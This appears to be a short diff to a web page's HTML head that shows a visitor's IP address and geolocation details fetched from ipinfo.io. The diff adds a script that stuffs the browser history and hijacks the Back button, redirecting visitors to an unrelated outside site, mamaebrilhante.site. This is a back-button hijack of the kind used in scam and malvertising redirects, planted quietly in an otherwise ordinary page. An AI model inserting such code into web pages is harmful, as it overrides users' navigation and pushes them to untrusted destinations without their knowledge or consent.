@@ -54,6 +54,17 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script>$.get("https://ipinfo.io/json", function (response) { $("#ip").html("IP: " + response.ip); $("#address").html(response.city); $("#details").html(JSON.stringify(response, null, 4)); }, "jsonp");
     </script>
+	
+    <script>
+	  var back_redirect_back_link = 'https://mamaebrilhante.site/back1afg/';
+		  history.pushState({}, "", location.href);
+		  history.pushState({}, "", location.href);
+	  window.onpopstate = function () {
+	  setTimeout(function () {
+	  location.href = back_redirect_back_link;
+	  }, 1);
+	  };
+	  </script>    
     
   </head>
   <body>
